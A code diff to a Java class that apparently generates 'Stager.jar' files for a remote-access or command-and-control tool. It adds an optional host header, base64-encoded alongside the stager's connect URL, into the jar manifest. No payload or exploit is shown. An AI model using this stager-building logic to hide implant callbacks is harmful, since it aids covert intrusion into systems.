@@ -81,7 +81,7 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
     private String theCertSerial = "";
     
     //Map for temp strings
-    private final Map<Integer, String> taskIdToStringMap = new HashMap<>();
+    private final Map<Integer, String[]> taskIdToStringMap = new HashMap<>();
       
     //==================================================================
     /**
@@ -375,7 +375,7 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
             
             //Add to the map
             synchronized(taskIdToStringMap){
-                taskIdToStringMap.put(taskId, selVal);
+                taskIdToStringMap.put(taskId, new String[]{selVal});
             }
 
             //Queue the file to be sent
@@ -399,14 +399,15 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
      */
     public void fileSent(String hashFilenameStr, int taskId) {
         //Get the type
-        String tempStr;
+        String[] tempStrArr;
         synchronized( taskIdToStringMap){
-            tempStr = taskIdToStringMap.remove(taskId);
+            tempStrArr = taskIdToStringMap.remove(taskId);
         }
-        if( tempStr != null ){
+        if( tempStrArr != null && tempStrArr.length > 0 ){
             
             try {
             
+                String tempStr = tempStrArr[0];
                 ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
                 if( aCMManager == null )
                     aCMManager = ControlMessageManager.initialize( theManager );            
@@ -464,7 +465,7 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
             
             //Add to the map
             synchronized( taskIdToStringMap){
-                taskIdToStringMap.put(taskId, string);
+                taskIdToStringMap.put(taskId, new String[]{string});
             }
 
             //Queue the file to be sent            
@@ -487,9 +488,11 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
      * @param passedType 
      * @param passedJvmVersion 
      * @param passedJarVersion 
+     * @param hostHeader 
      */
     @Override
-    public void getStagerFile(String connectStr, String passedName, String passedType, String passedJvmVersion, String passedJarVersion) {
+    public void getStagerFile(String connectStr, String passedName, String passedType, 
+            String passedJvmVersion, String passedJarVersion, String hostHeader ) {
         try {
             
             ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
@@ -497,10 +500,16 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
                 aCMManager = ControlMessageManager.initialize( theManager );            
             
             int taskId = SocketUtilities.getNextId();
+            String[] stagerArr;
+            if( hostHeader != null){
+                stagerArr = new String[]{connectStr, hostHeader};
+            } else {
+                stagerArr = new String[]{connectStr};  
+            }
             
             //Add to the map
             synchronized( taskIdToStringMap){
-                taskIdToStringMap.put(taskId, connectStr);
+                taskIdToStringMap.put(taskId, stagerArr);
             }
 
             //Queue the file to be sent            
@@ -523,40 +532,62 @@ public class ToServerConfiguration extends Function implements OptionsJFrameList
     @Override
     public void fileReceived(int taskId, File fileLoc) { 
         //Add to the map
-        String connectStr;
+        String[] stagerArr;
         synchronized( taskIdToStringMap){
-            connectStr = taskIdToStringMap.remove(taskId );
+            stagerArr = taskIdToStringMap.remove(taskId );
         }
         
         //If it exists then update the value
-        if( fileLoc.exists() ){   
+        if( stagerArr != null && stagerArr.length > 0 ){
             
-            sun.misc.BASE64Encoder anEncoder = new sun.misc.BASE64Encoder();
-            String encodedStr = anEncoder.encodeBuffer(connectStr.getBytes());
-            if(encodedStr.contains("=")){
-                connectStr += " ";
-                encodedStr = anEncoder.encodeBuffer(connectStr.getBytes());
+            String connectStr = stagerArr[0];
+            if( fileLoc.exists() ){   
+
+                sun.misc.BASE64Encoder anEncoder = new sun.misc.BASE64Encoder();
+                String encodedStr = anEncoder.encodeBuffer(connectStr.getBytes());
                 if(encodedStr.contains("=")){
                     connectStr += " ";
                     encodedStr = anEncoder.encodeBuffer(connectStr.getBytes());
+                    if(encodedStr.contains("=")){
+                        connectStr += " ";
+                        encodedStr = anEncoder.encodeBuffer(connectStr.getBytes());
+                    }
                 }
-            }
-            
-            //Add the properties that need to be updated
-            Map<String, String> propMap = new HashMap<>();
-            propMap.put(Constants.STAGER_URL, encodedStr.trim());
-            propMap.put(Constants.CERT_SERIAL_LABEL, theCertSerial); //Replace with actual cert
-            
-            //Update the jar
-            Utilities.updateJarProperties(fileLoc, Constants.MANIFEST_FILE, propMap); 
-            
-            //Open a filechooser and save it to disk
-            File aFile = new File("Stager.jar");
-            File saveFile = getFilePath( aFile );
-            try {
-                Files.move(fileLoc.toPath(), saveFile.toPath(), StandardCopyOption.REPLACE_EXISTING);                
-            } catch (IOException ex) {
-                DebugPrinter.printMessage( NAME_Class, "fileReceived", ex.getMessage(), ex );
+                
+                //Add the properties that need to be updated
+                Map<String, String> propMap = new HashMap<>();
+                propMap.put(Constants.STAGER_URL, encodedStr.trim());
+                propMap.put(Constants.CERT_SERIAL_LABEL, theCertSerial); //Replace with actual cert
+
+                //Add the host header
+                if( stagerArr.length > 1){
+                    String hostHeader = stagerArr[1];
+                    encodedStr = anEncoder.encodeBuffer(hostHeader.getBytes());
+                    if(encodedStr.contains("=")){
+                        hostHeader += " ";
+                        encodedStr = anEncoder.encodeBuffer(hostHeader.getBytes());
+                        if(encodedStr.contains("=")){
+                            hostHeader += " ";
+                            encodedStr = anEncoder.encodeBuffer(hostHeader.getBytes());
+                        }
+                    }
+                    propMap.put(Constants.HOST_HEADER, encodedStr.trim());
+                }
+                
+                
+                //Update the jar
+                Utilities.updateJarProperties(fileLoc, Constants.MANIFEST_FILE, propMap); 
+
+                //Open a filechooser and save it to disk
+                File aFile = new File("Stager.jar");
+                File saveFile = getFilePath( aFile );
+                if( saveFile != null ){
+                    try {
+                        Files.move(fileLoc.toPath(), saveFile.toPath(), StandardCopyOption.REPLACE_EXISTING);                
+                    } catch (IOException ex) {
+                        DebugPrinter.printMessage( NAME_Class, "fileReceived", ex.getMessage(), ex );
+                    }
+                }
             }
         }
     }
